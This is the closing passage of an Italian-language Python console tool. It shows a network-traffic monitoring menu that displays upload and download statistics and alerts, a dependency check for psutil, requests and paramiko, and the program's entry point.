        print(f"Velocità Upload: {stats['bytes_sent_formatted']}/s")
        print(f"Velocità Download: {stats['bytes_recv_formatted']}/s")
        print(f"Connessioni Attive: {stats['active_connections']}")
        
        if detailed:
            print("\nStatistiche Dettagliate:")
            print(f"Totale Dati Inviati: {stats['total_bytes_sent_formatted']}")
            print(f"Totale Dati Ricevuti: {stats['total_bytes_recv_formatted']}")
            print(f"Pacchetti Inviati: {stats['total_packets_sent']:,}")
            print(f"Pacchetti Ricevuti: {stats['total_packets_recv']:,}")
            
            if stats['baseline']:
                print("\nBaseline Traffic:")
                print(f"Media Upload: {self._format_bytes(stats['baseline']['bytes_sent_mean'])}/s")
                print(f"Media Download: {self._format_bytes(stats['baseline']['bytes_recv_mean'])}/s")

def network_monitor_menu():
    """Menu interattivo per il modulo di monitoraggio rete"""
    monitor = NetworkMonitor()
    
    while True:
        print("\n=== Menu Monitoraggio Rete ===")
        print("1. Avvia monitoraggio")
        print("2. Mostra statistiche")
        print("3. Mostra statistiche dettagliate")
        print("4. Visualizza alert")
        print("0. Torna al menu principale")
        
        choice = input("\nScegli un'opzione: ").strip()
        
        try:
            if choice == "1":
                monitor.start_monitoring()
                print("Monitoraggio avviato. Premi Ctrl+C per interrompere.")
                
                try:
                    while True:
                        monitor.print_stats()
                        
                        # Controlla alert
                        while not monitor.alert_queue.empty():
                            alert = monitor.alert_queue.get()
                            print_colored(f"\n[!] {alert['message']}", Colors.DANGER)
                            if 'details' in alert:
                                print("Dettagli:", json.dumps(alert['details'], indent=2))
                        
                        time.sleep(1)
                        
                except KeyboardInterrupt:
                    print("\nInterruzione monitoraggio...")
                finally:
                    monitor.stop_monitoring()
                    
            elif choice == "2":
                if not monitor.running:
                    print_colored("Il monitoraggio non è attivo!", Colors.WARNING)
                else:
                    monitor.print_stats()
                    
            elif choice == "3":
                if not monitor.running:
                    print_colored("Il monitoraggio non è attivo!", Colors.WARNING)
                else:
                    monitor.print_stats(detailed=True)
                    
            elif choice == "4":
                if monitor.alert_queue.empty():
                    print("Nessun alert presente.")
                else:
                    print("\nAlert recenti:")
                    while not monitor.alert_queue.empty():
                        alert = monitor.alert_queue.get()
                        print_colored(f"\n[!] {alert['message']}", Colors.DANGER)
                        if 'details' in alert:
                            print("Dettagli:", json.dumps(alert['details'], indent=2))
                            
            elif choice == "0":
                if monitor.running:
                    monitor.stop_monitoring()
                break
                
            else:
                print_colored("Opzione non valida!", Colors.WARNING)
                
        except Exception as e:
            print_colored(f"Errore: {str(e)}", Colors.DANGER)
            if monitor.running:
                monitor.stop_monitoring()
                
    

































# Inizializzazione configurazione globale
def init_config() -> None:
    """Inizializza la configurazione globale del programma"""
    try:
        # Verifica permessi e requisiti
        if os.name == 'posix' and os.geteuid() != 0:
            print_colored("ATTENZIONE: Alcuni moduli potrebbero richiedere privilegi di root", Colors.WARNING)
        
        # Verifica presenza librerie necessarie
        required_modules = ['psutil', 'requests', 'paramiko']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print_colored(f"ATTENZIONE: Moduli mancanti: {', '.join(missing_modules)}", Colors.WARNING)
            print("Installare i moduli con: pip install " + " ".join(missing_modules))
        
        logger.info("Inizializzazione completata con successo")
        
    except Exception as e:
        ExceptionHandler.handle_exception(e, "init_config")
        sys.exit(1)

def cleanup() -> None:
    """Pulizia risorse prima dell'uscita"""
    try:
        logger.info("Pulizia risorse in corso...")
        # Qui verranno aggiunte le operazioni di cleanup dei vari moduli
        logger.info("Pulizia completata")
    except Exception as e:
        ExceptionHandler.handle_exception(e, "cleanup")


def main():
    try:
        print_banner()
        init_config()  # Aggiunto init_config() per inizializzare la configurazione
        menu_manager = MenuManager()
        menu_manager.show_main_menu()
    except KeyboardInterrupt:
        print("\nChiusura in corso...")
        sys.exit(0)
    except Exception as e:
        ExceptionHandler.handle_exception(e, "main")
        sys.exit(1)
    finally:
        cleanup()

if __name__ == "__main__":
    try:
        # Stampa il banner del programma
        print_banner()

        # Inizializza il gestore del menu
        menu_manager = MenuManager()

        # Mostra il menu principale
        menu_manager.show_main_menu()

    except KeyboardInterrupt:
        # Gestione dell'interruzione da tastiera (Ctrl + C)
        print("\nProgramma interrotto manualmente.")
        sys.exit(0)

    except Exception as e:
        # Gestione di eventuali errori
        ExceptionHandler.handle_exception(e, "Programma principale")
        sys.exit(1)